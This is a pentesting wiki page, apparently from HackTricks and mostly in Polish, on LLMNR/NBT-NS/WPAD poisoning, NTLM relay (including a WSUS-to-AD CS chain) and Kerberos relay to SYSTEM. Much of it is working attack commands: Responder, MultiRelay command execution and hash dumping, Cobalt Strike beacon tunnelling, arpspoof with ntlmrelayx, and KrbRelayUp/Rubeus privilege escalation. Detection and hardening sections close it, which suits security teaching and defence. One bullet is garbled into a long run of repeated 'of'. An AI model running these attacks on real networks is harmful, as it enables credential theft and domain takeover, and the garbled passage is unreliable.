# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Protokoły sieciowe

### Protokoły rozwiązywania nazw lokalnych hostów

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft i inne systemy operacyjne używają LLMNR i NBT-NS do lokalnego rozwiązywania nazw, gdy DNS zawiedzie. Podobnie systemy Apple i Linux używają mDNS.
- Te protokoły są podatne na przechwytywanie i spoofing ze względu na brak uwierzytelnienia i charakter rozgłoszeniowy przez UDP.
- [Responder](https://github.com/lgandx/Responder) i [Dementor](https://github.com/MatrixEditor/Dementor) mogą być użyte do podszywania się pod usługi poprzez wysyłanie sfałszowanych odpowiedzi do hostów wysyłających zapytania do tych protokołów.
- Dalsze informacje o impersonacji usług przy użyciu Responder znajdują się [tutaj](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD umożliwia przeglądarkom automatyczne wykrywanie ustawień proxy.
- Wykrywanie jest ułatwiane przez DHCP, DNS lub fallback do LLMNR i NBT-NS, jeśli DNS zawiedzie.
- Responder może zautomatyzować ataki WPAD, kierując klientów do złośliwych serwerów WPAD.

### Responder/Dementor dla Protocol Poisoning

- **Responder** to narzędzie używane do zatruwania zapytań LLMNR, NBT-NS i mDNS, selektywnie odpowiadające w zależności od typu zapytania, głównie celując w usługi SMB.
- Jest preinstalowany w Kali Linux, konfigurowalny w /etc/responder/Responder.conf.
- Responder wyświetla przechwycone hashe na ekranie i zapisuje je w katalogu /usr/share/responder/logs.
- Obsługuje zarówno IPv4, jak i IPv6.
- Windowsowa wersja Responder jest dostępna [tutaj](https://github.com/lgandx/Responder-Windows).

- **Dementor** rozszerza tematykę multicast poisoning i dodatkowo działa jako złośliwy dostawca usług (w tym wsparcie dla CUPS RCE).
- Ogólna struktura jest podobna do **Responder** z bardziej granulowaną konfiguracją. (default is here: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Zgodność między **Dementor** a **Responder** znajduje się tutaj: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro i dokumentacja tutaj: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Naprawia problemy z przechwytywaniem wprowadzane przez Responder w niektórych protokołach

#### Uruchamianie Respondera

- Aby uruchomić Responder z ustawieniami domyślnymi: `responder -I <Interface>`
- Dla bardziej agresywnego sondowania (z potencjalnymi skutkami ubocznymi): `responder -I <Interface> -P -r -v`
- Techniki przechwytywania wyzwań/odpowiedzi NTLMv1 ułatwiające łamanie: `responder -I <Interface> --lm --disable-ess`
- Impersonacja WPAD może być aktywowana za pomocą: `responder -I <Interface> --wpad`
- Zapytania NetBIOS mogą być rozwiązywane na adres IP atakującego, a proxy uwierzytelniające można skonfigurować: `responder.py -I <interface> -Pv`

#### Uruchamianie Dementor

- Z zastosowaniem ustawień domyślnych: `Dementor -I <interface>`
- Z ustawieniami domyślnymi w trybie analizy: `Dementor -I <interface> -A`
- Automatyczne obniżenie sesji NTLM (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Uruchom bieżącą sesję z niestandardową konfiguracją: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Podszywanie się pod odpowiedzi DHCP może trwale zatruć informacje routingu ofiary, oferując bardziej ukryte alternatywy dla ARP poisoning.
- Wymaga precyzyjnej wiedzy o konfiguracji docelowej sieci.
- Uruchomienie ataku: `./Responder.py -I eth0 -Pdv`
- Ta metoda może skutecznie przechwycić hashe NTLMv1/2, ale wymaga ostrożnego postępowania, aby uniknąć zakłóceń w sieci.

### Przechwytywanie poświadczeń za pomocą Responder/Dementor

- Responder/Dementor będzie podszywać się pod usługi używając wyżej wymienionych protokołów, przechwytując poświadczenia (zwykle NTLMv2 Challenge/Response), gdy użytkownik spróbuje uwierzytelnić się wobec sfałszowanych usług.
- Można próbować obniżyć wersję do NetNTLMv1 lub wyłączyć ESS, aby ułatwić łamanie poświadczeń.

Należy pamiętać, że stosowanie tych technik powinno odbywać się legalnie i etycznie, z odpowiednią autoryzacją oraz unikając zakłóceń lub nieautoryzowanego dostępu.

## Inveigh

Inveigh jest narzędziem dla penetration testers i red teamers, zaprojektowanym dla systemów Windows. Oferuje funkcjonalności podobne do Responder, wykonując spoofing i man-in-the-middle attacks. Narzędzie ewoluowało z skryptu PowerShell do binarki C#, z [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) jako głównymi wersjami. Szczegółowe parametry i instrukcje można znaleźć w [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh can be operated through PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Lub uruchomiony jako plik binarny C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Ten atak wykorzystuje sesje uwierzytelniania SMB, aby uzyskać dostęp do maszyny docelowej i — jeśli zakończy się powodzeniem — uzyskać systemową powłokę. Kluczowe wymagania wstępne to:

- Uwierzytelniony użytkownik musi mieć dostęp Local Admin na hoście, na który przekazywane są poświadczenia.
- SMB signing powinno być wyłączone.

#### 445 Port Forwarding and Tunneling

W sytuacjach, gdy bezpośredni dostęp do sieci nie jest możliwy, ruch na porcie 445 musi być przekierowany i tunelowany. Narzędzia takie jak [**PortBender**](https://github.com/praetorian-inc/PortBender) pomagają przekierować ruch z portu 445 na inny port, co jest istotne, gdy dostęp Local Admin umożliwia driver loading.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Inne narzędzia do NTLM Relay Attack

- **Metasploit**: Skonfiguruj z użyciem proxies oraz ze szczegółami lokalnego i zdalnego hosta.
- **smbrelayx**: Skrypt Python do relaying sesji SMB oraz wykonywania poleceń lub wdrażania backdoors.
- **MultiRelay**: Narzędzie z Responder suite do relayowania konkretnych użytkowników lub wszystkich użytkowników, wykonywania poleceń lub dumpowania hashes.

Każde narzędzie można skonfigurować do działania przez SOCKS proxy w razie potrzeby, co pozwala na przeprowadzenie ataków nawet przy pośrednim dostępie do sieci.

### Działanie MultiRelay

MultiRelay uruchamia się z katalogu _**/usr/share/responder/tools**_, kierując ataki na określone IP lub użytkowników.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Te narzędzia i techniki tworzą kompleksowy zestaw do przeprowadzania ataków NTLM Relay w różnych środowiskach sieciowych.

### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

Klienci WSUS uwierzytelniają się do swojego serwera aktualizacji używając NTLM przez HTTP (8530) lub HTTPS (8531). Gdy HTTP jest włączone, okresowe zgłoszenia klientów mogą być wymuszone lub przechwycone na lokalnym segmencie i zrelayowane za pomocą ntlmrelayx do punktów końcowych LDAP/LDAPS/SMB lub AD CS HTTP (ESC8) bez łamania jakichkolwiek hashy. To wtapia się w normalny ruch aktualizacji i często daje uwierzytelnienia kont maszynowych (HOST$).

What to look for
- Konfiguracja GPO/rejestru pod HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate i ...\WindowsUpdate\AU:
- WUServer (np. http://wsus.domain.local:8530)
- WUStatusServer (adres raportowania)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled i DetectionFrequency (godziny)
- WSUS SOAP endpoints używane przez klientów przez HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Domyślne porty: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Nie uwierzytelnione
- Skanuj nasłuchujące usługi: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Przechwytuj ruch HTTP WSUS przez L2 MITM i loguj aktywnych klientów/punkty końcowe za pomocą wsusniff.py (HTTP tylko chyba że zmuszisz klientów do zaufania Twojemu certyfikatowi TLS).
- Z uwierzytelnieniem
- Parsuj SYSVOL GPO pod kątem kluczy WSUS za pomocą MANSPIDER + regpol (wsuspider.sh wrapper podsumowuje WUServer/WUStatusServer/UseWUServer).
- Query endpoints na dużą skalę z hostów (NetExec) lub lokalnie:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Ustaw się do MITM (ten sam L2), tak aby klient rozwiązywał serwer WSUS jako Twój (ARP/DNS poisoning, Bettercap, mitm6, itd.). Przykład z arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Przekieruj port 8530 do swojego nasłuchu relay (opcjonalne, wygodne):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Uruchom ntlmrelayx z HTTP listenerem (wymaga wsparcia Impacket dla HTTP listener; zobacz PRy poniżej):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Inne typowe cele:
- Relay do SMB (jeśli signing wyłączony) dla exec/dump: -t smb://<host>
- Relay do LDAPS dla zmian w katalogu (np. RBCD): -t ldaps://<DC>
- Relay do AD CS web enrollment (ESC8) by wydać cert i potem uwierzytelnić się przez Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Wymuś zgłoszenie klienta lub poczekaj na harmonogram. Z klienta:
wuauclt.exe /detectnow
lub użyj Windows Update UI (Check for updates).

5) Użyj uwierzytelnionych sesji SOCKS (jeśli -socks) lub bezpośrednich wyników relaya do post-exploitation (zmiany LDAP, operacje SMB lub wydanie certyfikatu AD CS do późniejszej autoryzacji).

HTTPS constraint (8531)
- Pastywne przechwycenie WSUS przez HTTPS jest nieskuteczne chyba że klienci zaufają Twojemu certyfikatowi. Bez zaufanego certyfikatu lub innego przełamania TLS, handshake NTLM nie może być zebrany/relayowany z ruchu WSUS HTTPS.

Notes
- WSUS został ogłoszony jako przestarzały, ale nadal jest szeroko wdrożony; HTTP (8530) wciąż jest powszechny w wielu środowiskach.
- Przydatne narzędzia: wsusniff.py (obserwuj HTTP WSUS check-ins), wsuspider.sh (wylicza WUServer/WUStatusServer z GPO), NetExec reg-query na dużą skalę.
- Impacket przywrócił wsparcie HTTP listenera dla ntlmrelayx w PR #2034 (pierwotnie dodane w PR #913).

### Force NTLM Logins

W Windows możesz **być w stanie wymusić, aby niektóre uprzywilejowane konta uwierzytelniły się do dowolnych maszyn**. Przeczytaj następującą stronę, aby dowiedzieć się jak:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** steals an **AP-REQ ticket** from one service and re-uses it against a second service that shares the **same computer-account key** (because both SPNs sit on the same `$` machine account). This works even though the SPNs’ **service classes differ** (e.g. `CIFS/` → `LDAP/`) because the *key* that decrypts the ticket is the machine’s NT hash, not the SPN string itself and the SPN string is not part of the signature.

Unlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\SYSTEM** in a single shot.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Token | Purpose | Relay relevance |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Potwierdza tożsamość użytkownika przed KDC | bez zmian |
| **Service ticket / TGS-REQ ↔ REP** | Powiązany z jednym **SPN**; zaszyfrowany kluczem właściciela SPN | wymienny jeśli SPNy współdzielą konto |
| **AP-REQ** | Klient wysyła `TGS` do usługi | **co kradziony i odtwarzany** |

* Tickets są szyfrowane kluczem pochodzącym od hasła konta, które posiada SPN.
* The **Authenticator** wewnątrz AP-REQ ma znacznik czasu 5 minut; odtworzenie w tym oknie jest ważne dopóki cache usługi nie wykryje duplikatu.
* Windows rzadko sprawdza, czy ciąg SPN w bilecie zgadza się z usługą, do której się łączysz, więc bilet dla `CIFS/HOST` zwykle odszyfruje się poprawnie na `LDAP/HOST`.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** źródłowe i docelowe SPNy należą do tego samego konta komputera (domyślnie na serwerach Windows).
2. **No channel protection:** SMB/LDAP signing wyłączony i EPA wyłączone dla HTTP/LDAPS.
3. **You can intercept or coerce authentication:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, itd.
4. **Ticket source not already used:** wygrywasz wyścig zanim prawdziwy pakiet dotrze lub całkowicie go zablokujesz; w przeciwnym razie cache replay serwera wyzwala Event 4649.
5. Musisz w jakiś sposób móc wykonać **MitM w komunikacji** — np. będąc częścią grupy DNSAdmins by modyfikować DNS domeny albo mając możliwość zmiany pliku HOST of of of of of of of of of of of of of of of of of of of of of of of

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Uruchom relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` zawiera **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** w jednym pliku binarnym.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce sprawia, że DC wysyła do nas bilet Kerberos `CIFS/DC01`.

- 3.4 **Relay the AP-REQ**

KrbRelay wyciąga GSS blob z SMB, pakuje go ponownie w LDAP bind i przekazuje do `ldap://DC01` — uwierzytelnianie powiedzie się, ponieważ **ten sam klucz** go odszyfrowuje.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Teraz posiadasz **NT AUTHORITY\SYSTEM**.


### **Więcej ścieżek wartych poznania**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Fałszywy serwer wysyła **GSS-ID payload** z dowolnym SPN; klient buduje AP-REQ bezpośrednio do ciebie | Działa nawet między podsieciami; machine creds domyślnie |
| **DCOM / MSRPC** | Złośliwy OXID resolver zmusza klienta do auth do dowolnego SPN i portu | Czysty *lokalny* priv-esc; omija firewall |
| **AD CS Web Enroll** | Relay machine ticket do `HTTP/CA` i zdobądź cert, potem **PKINIT** by wygenerować TGTs | Omija LDAP signing defenses |
| **Shadow Credentials** | Zapisz `msDS-KeyCredentialLink`, potem PKINIT z podrobioną parą kluczy | Brak potrzeby dodawania konta komputera |

### **Rozwiązywanie problemów**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Klucz ticketu ≠ klucz docelowy | Zły host/SPN |
| `KRB_AP_ERR_SKEW` | Przesunięcie czasu > 5 min | Synchronizuj czas lub użyj `w32tm` |
| LDAP bind fails | Wymuszono signing | Użyj ścieżki AD CS lub wyłącz signing |
| Event 4649 spam | Usługa wykryła zduplikowany Authenticator | zablokuj lub prześcignij (race) oryginalny pakiet |


### **Wykrywanie**

* Wzrost liczby **Event 4769** dla `CIFS/`, `HTTP/`, `LDAP/` z tego samego źródła w ciągu sekund.
* **Event 4649** na usłudze wskazuje na wykrycie replay.
* Logowanie Kerberos z **127.0.0.1** (relay do lokalnego SCM) jest wysoce podejrzane — zmapuj za pomocą reguły Sigma w dokumentacji KrbRelayUp.
* Monitoruj zmiany atrybutów `msDS-AllowedToActOnBehalfOfOtherIdentity` lub `msDS-KeyCredentialLink`.

## **Wzmocnienie**

1. **Wymuś LDAP & SMB signing + EPA** na każdym serwerze.
2. **Split SPNs** tak, aby HTTP nie był na tym samym koncie co CIFS/LDAP.
3. Załatuj wektory przymusu (PetitPotam KB5005413, DFS, AuthIP).
4. Ustaw **`ms-DS-MachineAccountQuota = 0`** aby zatrzymać dodawanie nieautoryzowanych komputerów.
5. Generuj alerty dla **Event 4649** i nieoczekiwanych loopback Kerberos logowań.



## References

- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
